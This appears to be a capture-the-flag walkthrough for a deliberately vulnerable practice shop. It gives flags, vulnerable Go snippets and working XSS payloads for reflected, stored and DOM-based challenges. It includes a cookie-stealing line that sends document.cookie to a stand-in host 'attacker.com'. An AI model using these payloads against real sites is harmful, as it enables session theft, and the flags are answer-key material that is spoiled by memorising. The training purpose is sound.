# Cross-Site Scripting (XSS) — PhantomShop Walkthroughs

## 1. Reflected XSS in Search (Easy — 100pts)
**Flag:** `FLAG{r3fl3ct3d_xss_sh0p}`
**Location:** `/search?q=`

### Vulnerability
The search term is reflected directly in the page HTML without encoding:
```html
<h2>Search results for: [YOUR INPUT HERE]</h2>
```

### Solution
```
http://localhost:8080/search?q=<script>alert('XSS')</script>
```
Or with an image tag:
```
http://localhost:8080/search?q=<img src=x onerror=alert(document.cookie)>
```

### Real-world impact
An attacker sends this link to a victim. When clicked, JavaScript runs in their browser — stealing cookies, session tokens, or redirecting to a phishing page.

---

## 2. Stored XSS in Product Reviews (Easy — 150pts)
**Flag:** `FLAG{st0r3d_xss_r3v13w}`
**Location:** Product review forms on any `/product/` page

### Vulnerability
Reviews are stored in the database and displayed without sanitization:
```go
// comment stored directly from user input
db.Exec("INSERT INTO reviews ... VALUES (?, ?, ?, ?)", ... comment)
// displayed without encoding
fmt.Sprintf("<p>%s</p>", comment)
```

### Solution
Go to any product page, submit a review:
```
Name: Hacker
Rating: ⭐⭐⭐⭐⭐
Comment: Great product! <script>alert('Stored XSS')</script>
```

Every visitor to that product page will execute your JavaScript.

### Real-world impact
Persistent — affects every user who views the product. Can steal admin session cookies: `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`

---

## 3. DOM XSS in Profile Bio (Medium — 200pts)
**Flag:** `FLAG{d0m_xss_pr0f1l3}`
**Location:** `/profile/edit` → profile bio field

### Vulnerability
The profile bio is rendered directly into the page DOM without sanitization:
```go
fmt.Sprintf(`<div class="profile-bio">%s</div>`, bio)
```

### Solution
1. Login (or use SQLi to bypass)
2. Go to `/profile/edit`
3. Set bio to: `<img src=x onerror=alert('DOM XSS')>`
4. View your profile — XSS fires

### Chained attack
Use IDOR (`/profile?id=1`) to view the admin's profile. If admin has a malicious bio set by an attacker, it fires when anyone views the profile.
